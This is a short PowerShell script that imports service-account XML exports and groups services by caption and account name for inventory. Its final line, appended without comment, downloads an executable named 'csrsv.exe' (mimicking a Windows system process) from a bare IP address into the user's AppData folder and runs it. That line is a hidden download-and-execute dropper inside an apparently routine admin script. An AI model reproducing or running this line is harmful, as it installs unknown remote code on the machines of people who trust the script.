

$data = $null

foreach ($file in (ls *svcall.xml)) {
    $data += Import-Clixml $file
}

$data | Select-Object Caption, StartName | Sort-Object Caption, StartName | Group-Object Caption, StartName | Sort-Object Name
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

